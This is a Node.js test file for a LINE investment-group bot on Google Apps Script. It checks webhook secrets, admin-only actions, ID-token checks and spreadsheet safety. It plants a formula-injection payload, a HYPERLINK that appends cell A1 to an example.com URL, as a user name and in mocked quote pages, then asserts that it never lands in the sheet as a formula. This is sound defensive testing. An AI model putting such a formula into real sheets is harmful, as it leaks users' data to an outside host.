// ボットと画面の API のテスト（本番のシート・LINE には触らない）。
//   node --test test/
// 道具は q-oqrn の tools/qtest（となりに q-oqrn を置いておく）。決まりは q-oqrn の docs/security.md。
"use strict";
const test = require("node:test");
const assert = require("node:assert");
const path = require("node:path");
const { createGas, response } = require(path.join(__dirname, "../../q-oqrn/tools/qtest/fake-gas.js"));

const GROUP = "C" + "1".repeat(32);
const OTHER_GROUP = "C" + "2".repeat(32);
const MEMBER = "U" + "a".repeat(32);
const NEWCOMER = "U" + "b".repeat(32);
const ADMIN = "U" + "c".repeat(32);
const OUTSIDER = "U" + "d".repeat(32);
const CHANNEL = "2011004889";
const FORMULA = '=HYPERLINK("https://example.com/?x="&A1,"見て")';

// 画面の印（ID トークン）と、その持ち主
const TOKENS = { "tok-member": MEMBER, "tok-admin": ADMIN, "tok-outsider": OUTSIDER, "tok-newcomer": NEWCOMER };
// グループにいる人と、LINE の名前
const GROUP_MEMBERS = { [GROUP]: { [MEMBER]: "メンバー", [NEWCOMER]: FORMULA, [ADMIN]: "管理者" }, [OTHER_GROUP]: { [OUTSIDER]: "よその人" } };

function lineFetch(url, opt) {
  if (/\/oauth2\/v2\.1\/verify$/.test(url)) {
    const p = opt.payload || {};
    const sub = TOKENS[p.id_token];
    if (!sub || p.client_id !== CHANNEL) return response(400, { error: "invalid_request" });
    return response(200, { sub, aud: CHANNEL, exp: Date.now() / 1000 + 3600 });
  }
  let m = url.match(/\/v2\/bot\/group\/([^/]+)\/member\/([^/?]+)$/);
  if (m) {
    const name = (GROUP_MEMBERS[decodeURIComponent(m[1])] || {})[decodeURIComponent(m[2])];
    return name ? response(200, { displayName: name, userId: decodeURIComponent(m[2]) }) : response(404, { message: "Not found" });
  }
  if (/\/v2\/bot\/group\/[^/]+\/summary$/.test(url)) return response(200, { groupName: "投資の会" });
  if (/google\.com\/finance\/quote\/7203/.test(url)) {
    // 相場のページの文字も「外からの文字」
    return response(200, `<div>7203:TYO</div><div>${FORMULA.replace(/"/g, "&quot;")}</div><div>¥3,000</div><div>+1.20%</div>`);
  }
  if (/google\.com\/finance/.test(url)) return response(404, "");
  return response(200, {});
}

// setupInvestmentGroupBot と同じシートを作る（偽物の GAS は、シートを隠す操作を持っていないので、隠すところだけ飛ばす）
function setupSheets(gas) {
  const book = gas.eval("SpreadsheetApp.openById('SPREADSHEET_TEST')");
  const src = require("node:fs").readFileSync(path.join(__dirname, "../src/90_setup_investment_group_bot.gs"), "utf8");
  const calls = [...src.matchAll(/ensureSheetWithHeaders_\(spreadsheet, ([^,]+), \[([\s\S]*?)\]\);/g)];
  calls.forEach((m) => {
    const name = m[1].startsWith("'") ? m[1].slice(1, -1) : gas.eval(m[1]);
    const headers = [...m[2].matchAll(/'([^']+)'/g)].map((h) => h[1]);
    gas.call("ensureSheetWithHeaders_", book, name, headers);
  });
  gas.call("seedOrUpdateDefaultRule_");
}

function make(extraProps = {}) {
  const gas = createGas({
    dir: path.join(__dirname, "../src"),
    properties: {
      SPREADSHEET_ID: "SPREADSHEET_TEST",
      LINE_CHANNEL_ACCESS_TOKEN: "test-token",
      WEBHOOK_KEY: "hook-secret",
      ADMIN_USER_IDS: ADMIN,
      ALLOWED_GROUP_IDS: GROUP,
      ALLOWED_USER_IDS: [MEMBER, OUTSIDER].join(","),
      LIFF_APP_BASE_URL: "https://katsuan.github.io/investment/liff/",
      ...extraProps,
    },
    fetch: lineFetch,
  });
  setupSheets(gas);
  gas.seed("WATCHLIST", [
    gas.rows("WATCHLIST")[0],
    [GROUP, "6758", "ソニーグループ", "", "2026-10-01 09:00:00", "6758:TYO", "3000", "", "", "", MEMBER, "メンバー", true, "", "", "", "2026-10-01 09:00:00"],
  ]);
  gas.seed("MEMBERS", [gas.rows("MEMBERS")[0], [GROUP, MEMBER, "メンバー", "", "2026-10-01 09:00:00", 1, true, ""]]);
  gas.reset();
  fresh(gas);
  return gas;
}

// 本物の GAS は、呼び出しのたびに新しく始まる。偽物では、1回の呼び出しの中だけの覚えを消してから呼ぶ
function fresh(gas) {
  // 偽物にない Utilities.formatString（%s と %% だけ使っている）
  gas.eval("if (!Utilities.formatString) Utilities.formatString = function (f) { var a = Array.prototype.slice.call(arguments, 1); return String(f).replace(/%%|%s/g, function (m) { return m === '%%' ? '%' : String(a.shift()); }); };");
  gas.eval("clearTableDataMemo_(); SPREADSHEET_MEMO_ = null; SCRIPT_PROPERTIES_MEMO_ = null; EVENT_LOG_HEADERS_MEMO_ = null;" +
    "Object.keys(MEMBER_PROFILE_MEMO_).forEach(function (k) { delete MEMBER_PROFILE_MEMO_[k]; });");
  return gas;
}
const event = (gas, ev, opts = { key: "hook-secret" }) => fresh(gas).lineEvent(ev, opts);
const text = (gas, t, userId = MEMBER, opts = { key: "hook-secret" }) =>
  event(gas, { type: "message", replyToken: "r-" + Math.random(), source: { type: "group", groupId: GROUP, userId }, message: { type: "text", text: t } }, opts);
const replyTexts = (gas) => JSON.stringify(gas.replies());
const liff = (gas, params) => fresh(gas).doGet({ action: "liff_data", groupId: GROUP, view: "watchlist", ...params });

// ---- LINE の Webhook ----

test("Webhook：合言葉なし・ちがう合言葉の知らせは、何もしない", () => {
  for (const opts of [{}, { key: "wrong" }]) {
    const gas = make();
    text(gas, "#解除", ADMIN, opts);
    text(gas, "#グループ許可", ADMIN, opts);
    assert.equal(gas.replies().length, 0);
    assert.equal(gas.rows("WATCHLIST")[1][12], true, "注目が外れていない");
    assert.equal(gas.rows("EVENT_LOG").length, 1, "記録も増えない");
  }
});

test("Webhook：合言葉が合えば返事をする", () => {
  const gas = make();
  text(gas, "#ルール");
  assert.equal(gas.replies().length, 1);
});

test("グループの外（1対1）の知らせには、返事も記録もしない", () => {
  const gas = make();
  event(gas, { type: "message", replyToken: "r", source: { type: "user", userId: MEMBER }, message: { type: "text", text: "#ルール" } }, { key: "hook-secret" });
  assert.equal(gas.replies().length, 0);
  assert.equal(gas.rows("EVENT_LOG").length, 1);
});

test("管理者だけの操作：管理者でない人は、全部外す・グループ許可ができない", () => {
  const gas = make();
  text(gas, "#解除", MEMBER);
  assert.equal(gas.rows("WATCHLIST")[1][12], true);
  text(gas, "#グループ許可", MEMBER);
  assert.match(replyTexts(gas), /管理者だけ/);
  assert.equal(gas.call("getAllowedGroupIds_").length, 1);
});

test("ほかの人の注目は、入れた人か管理者しか外せない", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  text(gas, "#解除 6758", NEWCOMER);
  assert.equal(gas.rows("WATCHLIST")[1][12], true);
  assert.match(replyTexts(gas), /入れた人か管理者だけ/);
  text(gas, "#解除 6758", ADMIN);
  assert.equal(gas.rows("WATCHLIST")[1][12], false);
});

test("#Bot設定：ほかのグループの数は、管理者にだけ出す", () => {
  const gas = make();
  text(gas, "#Bot設定", MEMBER);
  assert.doesNotMatch(replyTexts(gas), /許可グループ数/);
  gas.reset();
  text(gas, "#Bot設定", ADMIN);
  assert.match(replyTexts(gas), /許可グループ数/);
});

test("返事や記録に、LINE のユーザー ID をそのまま出さない", () => {
  const gas = make();
  gas.seed("MEMBERS", [gas.rows("MEMBERS")[0], [GROUP, NEWCOMER, "", "", "", "", true, ""]]);
  text(gas, "#未確認");
  text(gas, "#ルール", OUTSIDER);
  assert.doesNotMatch(replyTexts(gas), new RegExp(NEWCOMER));
  const log = JSON.stringify(gas.rows("EVENT_LOG"));
  assert.doesNotMatch(log, /U[0-9a-f]{32}/);
});

// ---- 外の文字がシートに式のまま入らない ----

test("LINE の名前・相場のページの文字は、式のままシートに入らない", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  text(gas, "#7203", NEWCOMER); // 名前が = で始まる人が、銘柄名が = で始まる銘柄を入れる
  event(gas, { type: "postback", replyToken: "r", source: { type: "group", groupId: GROUP, userId: NEWCOMER }, postback: { data: "action=agree_rules&ruleVersion=1" } }, { key: "hook-secret" });
  assert.ok(gas.rows("WATCHLIST").length >= 3, "注目に入った");
  assert.ok(gas.rows("MARKET_DATA").length >= 2, "相場を覚えた");
  assert.deepEqual(gas.formulaCells(), []);
});

test("ルールの文（--- で始まる）も、式にならない", () => {
  const gas = createGas({ dir: path.join(__dirname, "../src"), properties: { SPREADSHEET_ID: "SPREADSHEET_TEST" }, fetch: lineFetch });
  setupSheets(gas);
  fresh(gas).call("updateDefaultRuleVersionOne");
  assert.deepEqual(gas.formulaCells(), []);
});

// ---- 画面（LIFF）からの呼び出し ----

test("画面：本人の印がない・偽の印・userId だけの呼び出しは断る", () => {
  const gas = make();
  assert.equal(liff(gas, {}).ok, false);
  assert.equal(liff(gas, { userId: MEMBER }).ok, false, "送られた userId は信じない");
  assert.equal(liff(gas, { idToken: "forged" }).ok, false);
  assert.equal(liff(gas, { idToken: "forged" }).error, "login required");
});

test("画面：グループにいて、ルールを確認した人は見られる", () => {
  const gas = make();
  const res = liff(gas, { idToken: "tok-member" });
  assert.equal(res.ok, true);
  assert.equal(res.data.items[0].ticker, "6758");
  const perf = liff(gas, { idToken: "tok-member", view: "performance" });
  assert.equal(perf.ok, true);
  assert.doesNotMatch(JSON.stringify(perf), /U[0-9a-f]{32}/, "ほかのメンバーの ID は返さない");
});

test("画面：よそのグループの人は、許可されていても見られない", () => {
  const gas = make();
  const res = liff(gas, { idToken: "tok-outsider" });
  assert.equal(res.ok, false);
  assert.equal(res.error, "access denied");
});

test("画面：ルールをまだ確認していない人は見られない", () => {
  const gas = make();
  assert.equal(liff(gas, { idToken: "tok-newcomer" }).ok, false);
});

test("画面：groupId・銘柄コードの形がちがうものは断る", () => {
  const gas = make();
  assert.equal(fresh(gas).doGet({ action: "liff_data", groupId: "x", view: "watchlist", idToken: "tok-member" }).ok, false);
  assert.equal(liff(gas, { idToken: "tok-member", view: "quote", ticker: "=1+1" }).ok, false);
  assert.equal(liff(gas, { idToken: "tok-member", view: "quote", ticker: "A".repeat(40) }).ok, false);
  assert.equal(gas.fetches.filter((f) => /google\.com\/finance/.test(f.url)).length, 0);
});

test("health はだれでも呼べるが、個人の情報を返さない", () => {
  const gas = make();
  const res = gas.doGet({ action: "health" });
  assert.doesNotMatch(String(res), /U[0-9a-f]{32}|C[0-9a-f]{32}/);
});

// ---- 返事のカード ----

test("主な返事は、LINE が受けつける形", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  ["#ルール", "#使い方", "#注目一覧", "#注目実績", "#Bot設定", "#未確認", "#7203", "#6758", "#解除 6758"].forEach((t) => text(gas, t));
  text(gas, "#ルール", OUTSIDER);
  event(gas, { type: "memberJoined", replyToken: "r", source: { type: "group", groupId: GROUP }, joined: { members: [{ type: "user", userId: NEWCOMER }] } }, { key: "hook-secret" });
  assert.ok(gas.replies().length >= 10);
  assert.deepEqual(gas.flexProblems().filter((p) => p.level === "error"), []);
});

// カードの中の押せるもの（ボタン・押せる箱）を全部ひろう
function cardActions(messages) {
  const found = [];
  (function walk(node) {
    if (!node || typeof node !== "object") return;
    if (node.action) found.push(node.action);
    Object.keys(node).forEach((k) => k !== "quickReply" && walk(node[k]));
  })(messages.filter((m) => m.type === "flex").map((m) => m.contents));
  return found;
}
// あとで押されても困らないもの：画面・URL を開く／文字を送る（聞き返す・#コードで新しく記録）／入力欄に文字を入れるだけ
const isSafeLater = (a) => a.type === "uri" || a.type === "message" || (a.type === "postback" && /^action=usage_prefill/.test(a.data));
const agree = (gas, userId, data) =>
  event(gas, { type: "postback", replyToken: "r-" + Math.random(), source: { type: "group", groupId: GROUP, userId }, postback: { data } });

test("カードのボタンは、あとで押されても困らないものだけ（ルールの確認はクイックリプライ）", () => {
  const gas = make({ ALLOWED_USER_IDS: [MEMBER, NEWCOMER].join(",") });
  ["#ルール", "#使い方", "#注目一覧", "#注目実績", "#Bot設定", "#7203", "#6758"].forEach((t) => text(gas, t));
  text(gas, "#注目一覧", OUTSIDER);
  event(gas, { type: "memberJoined", replyToken: "r", source: { type: "group", groupId: GROUP }, joined: { members: [{ type: "user", userId: NEWCOMER }] } });
  const all = gas.replies().flatMap((r) => r.messages);
  assert.deepEqual(cardActions(all).filter((a) => !isSafeLater(a)), []);
  // 入ってきた人・未確認の人には、最後のメッセージのクイックリプライに「確認しました」
  const prompts = gas.replies().slice(-2).map((r) => r.messages[r.messages.length - 1]);
  prompts.forEach((m) => {
    assert.match(JSON.stringify(m.contents), /下のボタンからえらんでね/);
    assert.ok(m.quickReply.items.some((it) => /^action=agree_rules/.test(it.action.data || "")));
    assert.deepEqual(gas.flexProblems([m]).filter((p) => p.level === "error"), []);
  });
});

test("古いボタン・ほかの人のボタン・2回目は、記録しなおさずにやさしく返す", () => {
  const gas = make();
  gas.seed("MEMBERS", [gas.rows("MEMBERS")[0], [GROUP, MEMBER, "メンバー", "", "2026-10-01 09:00:00", 1, true, ""], [GROUP, NEWCOMER, "", "", "", "", true, ""]]);
  agree(gas, OUTSIDER, `action=agree_rules&ruleVersion=1&targetUserIds=${NEWCOMER}`);
  assert.match(replyTexts(gas), /案内した人のため/);
  agree(gas, NEWCOMER, "action=agree_rules&ruleVersion=0");
  assert.match(replyTexts(gas), /ルールが新しくなりました/);
  assert.equal(gas.rows("MEMBERS")[2][5], "", "古い版では記録しない");
  agree(gas, MEMBER, "action=agree_rules&ruleVersion=1");
  assert.match(replyTexts(gas), /もう記録しています/);
  agree(gas, MEMBER, "action=something_old");
  assert.match(replyTexts(gas), /いまは使えません/);
  agree(gas, NEWCOMER, `action=agree_rules&ruleVersion=1&targetUserIds=${NEWCOMER}`);
  assert.equal(Number(gas.rows("MEMBERS")[2][5]), 1, "本人がいまの版で押せば記録する");
  assert.equal(gas.replies().length, 5, "どれにも返事をする");
});

test("カードが断られたら、文字だけを push で送りなおす（同じ返事の合図を2回使わない）", () => {
  let rejected = false;
  const gas = createGas({
    dir: path.join(__dirname, "../src"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", WEBHOOK_KEY: "hook-secret", ALLOWED_GROUP_IDS: GROUP, ALLOWED_USER_IDS: MEMBER, LIFF_APP_BASE_URL: "https://katsuan.github.io/investment/liff/" },
    fetch: (url, opt) => {
      if (/message\/reply$/.test(url) && !rejected) {
        rejected = true;
        return response(400, { message: "A message (messages[0]) in the request body is invalid" });
      }
      return lineFetch(url, opt);
    },
  });
  setupSheets(gas);
  gas.reset();
  text(gas, "#使い方");
  assert.deepEqual(gas.reusedReplyTokens(), []);
  const pushed = gas.replies().filter((r) => r.kind === "push");
  assert.equal(pushed.length, 1);
  assert.equal(pushed[0].to, GROUP);
  assert.equal(pushed[0].messages[0].type, "text");
});

test("横に並べるカードは、大きさがそろっている", () => {
  const gas = make();
  const stats = gas.call("buildWatchPerformanceStats_", GROUP, {});
  const top = gas.call("buildTopPerformerWatchSpotlightData_", GROUP, stats, {});
  const perf = gas.call("buildWatchPerformanceSummaryFlexMessage_", GROUP, stats, top, top);
  const records = gas.call("hydrateRecentWatchlistWithCurrentQuotes_", gas.call("getActiveWatchlistByGroup_", GROUP), {});
  const list = gas.call("buildWatchlistSummaryFlexMessage_", GROUP, records, records.length);
  assert.equal(perf.contents.type, "carousel");
  assert.deepEqual(gas.flexProblems([perf, list]).filter((p) => p.level === "error"), []);
});

test("使う前の確かめのカードも、LINE が受けつける形", () => {
  const gas = make();
  const cards = gas.eval("Q_SELF_CHECK.cards()");
  assert.ok(cards.length >= 5);
  assert.deepEqual(gas.flexProblems(cards).filter((p) => p.level === "error"), []);
});
